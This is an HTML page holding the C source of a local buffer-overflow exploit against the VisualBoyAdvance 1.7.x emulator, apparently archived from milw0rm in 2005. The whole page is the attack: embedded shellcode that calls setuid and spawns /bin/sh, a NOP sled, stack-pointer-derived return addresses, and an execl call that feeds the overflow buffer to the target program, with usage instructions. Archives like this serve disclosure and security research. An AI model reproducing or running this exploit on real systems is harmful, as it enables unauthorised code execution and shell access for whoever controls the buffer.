<html><head><title>VisualBoyAdvanced 1.7.x Local Shell Exploit (non suid) (updated)</title></head><pre>/*
VisualBoyAdvanced 1.7.x BufferOver Flow exploit
VBA - WEBSITE : vba.ngemu.com
Found &amp; coded by Qnix - Qnix[at]bsdmail[dot]org
*/

#include &lt;stdlib.h&gt;

char shellcode[] =
       &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot; /* setuid() */
       &quot;\xeb\x5a\x5e\x31\xc0\x88\x46\x07\x31\xc0\x31\xdb\xb0\x27\xcd&quot;
       &quot;\x80\x85\xc0\x78\x32\x31\xc0\x31\xdb\x66\xb8\x10\x01\xcd\x80&quot;
       &quot;\x85\xc0\x75\x0f\x31\xc0\x31\xdb\x50\x8d\x5e\x05\x53\x56\xb0&quot;
       &quot;\x3b\x50\xcd\x80\x31\xc0\x8d\x1e\x89\x5e\x08\x89\x46\x0c\x50&quot;
       &quot;\x8d\x4e\x08\x51\x56\xb0\x3b\x50\xcd\x80\x31\xc0\x8d\x1e\x89&quot;
       &quot;\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c&quot;
       &quot;\xcd\x80\xe8\xa1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&quot;;


unsigned long sp(void)
{ __asm__(&quot;movl %esp, %eax&quot;);}

int main(int argc, char *argv[])
{
  int i, offset;
  long esp, ret, *addr_ptr;
  char *buffer, *ptr;

  offset = 0;
  esp = sp();
  ret = esp - offset;

if (argc &gt;= 2) {
printf(&quot;\n ************************************************ \n&quot;);
printf(&quot; VisualBoyAdvanced 1.7.x BufferOver Flow exploit \n&quot;);
printf(&quot;            by Qnix[at]bsdmail[dot]org      &quot;);
printf(&quot;\n ************************************************ \n\n&quot;);
printf(&quot;[~] Stack pointer (ESP) : 0x%x\n&quot;, esp);
printf(&quot;[~] Offset from ESP     : 0x%x\n&quot;, offset);
printf(&quot;[~] Desired Return Addr : 0x%x\n\n&quot;, ret);
} else {
printf(&quot;\n ************************************************ \n&quot;);
printf(&quot; VisualBoyAdvanced 1.7.x BufferOver Flow Exploit \n&quot;);
printf(&quot;            by Qnix[at]bsdmail[dot]org      &quot;);
printf(&quot;\n ************************************************ \n\n&quot;);
printf(&quot;useage : ./vba-exp &lt;VisualBoyAdvanced File&gt; \n\n&quot;);
}

buffer = malloc(2300);

ptr = buffer;
addr_ptr = (long *) ptr;
for(i=0; i &lt; 2300; i+=4)
{ *(addr_ptr++) = ret; }

for(i=0; i &lt; 1900; i++)
{ buffer[i] = '\x90'; }

ptr = buffer + 1900;
for(i=0; i &lt; strlen(shellcode); i++)
{ *(ptr++) = shellcode[i]; }

buffer[2300-1] = 0;

execl(argv[1],&quot;VisualBoyAdvance&quot;,buffer,0);

free(buffer);

  return 0;
}

// milw0rm.com [2005-09-13]</pre></html>